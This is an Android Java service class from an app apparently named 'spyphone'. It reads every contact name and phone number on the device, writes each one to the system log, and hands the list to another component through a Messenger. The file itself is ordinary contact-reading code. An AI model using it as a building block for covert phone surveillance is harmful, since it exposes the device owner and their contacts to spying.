package emit.esy.es.spyphone.services;

import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.provider.ContactsContract;
import android.util.Log;

import java.util.ArrayList;

import emit.esy.es.spyphone.interfaces.ServiceResponse;
import emit.esy.es.spyphone.model.Contact;

/**
 * Created by Emil Makovac on 27/04/2015.
 */
public class ContactsService extends IntentService implements ServiceResponse{

    private static final String LOG_TAG = "ContactsService";
    ArrayList<Contact> contactList;

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     * @param name Used to name the worker thread, important only for debugging.
     */
    public ContactsService(String name) {
        super(name);
    }

    public ContactsService() {
        super(LOG_TAG);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Log.d(LOG_TAG, "onHandleIntent");

        contactList = new ArrayList<>();

        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        while (phones.moveToNext())
        {
            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            Contact contact = new Contact(name, phoneNumber);
            if(!contactList.contains(contact)) {
                contactList.add(contact);
                Log.d(LOG_TAG, contact.getFullName() + " - " + contact.getPhoneNumber());
            }
        }
        phones.close();
        onWorkDone(intent);
    }

    @Override
    public void onWorkDone(Intent intent) {
        Log.d(LOG_TAG, "onWorkDone");

        Bundle bundle = intent.getExtras();
        Bundle data = new Bundle();
        data.putString("action", "contacts");
        data.putSerializable("content", contactList);
        if (bundle != null) {
            Messenger messenger = (Messenger) bundle.get("messenger");
            Message msg = Message.obtain();
            msg.setData(data);//put the data here
            try {
                messenger.send(msg);
            } catch (RemoteException e) {
                Log.i("error", "error");
            }
        }
    }

    @Override
    public void onDestroy() {
        Log.d(LOG_TAG, "onDestroy");
        super.onDestroy();
    }
}
